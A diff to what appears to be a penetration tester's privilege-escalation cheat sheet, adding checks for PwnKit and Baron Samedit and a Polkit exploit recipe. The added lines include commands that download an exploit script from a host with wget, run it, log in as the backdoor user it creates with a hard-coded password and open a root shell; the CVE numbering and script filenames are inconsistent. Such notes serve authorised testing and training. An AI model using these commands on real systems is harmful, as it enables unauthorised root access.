@@ -225,7 +225,23 @@ put script
 ===================================
 PwnKit
 ll /usr/bin/pkexec 
+-rwxr-xr-x 1 root root /usr/bin/pkexec  ..not vuln
+-rwsr--r-- 1 root root /usr/bin/pkexec  ..SUID vulnerable!
 https://github.com/arthepsy/CVE-2021-4034
+
+Baron Samedit (CVE-2021-3156)
+sudoedit -s /.     ...Vulnerable: if error sudoedit: /: not a regular file
+sudoedit -s /.     ...Not vuln: sudoedit usage results
+
+Polkit (CVE-2021-3650)
+https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
+wget http://192.168.162.46/cve-2021-3650.sh
+bash polkit.sh   ...try more than once
+su - secnigma
+pass: secnigmaftw 
+sudo bash
+sudo su -
+
 
 ===================================
 TOOLS
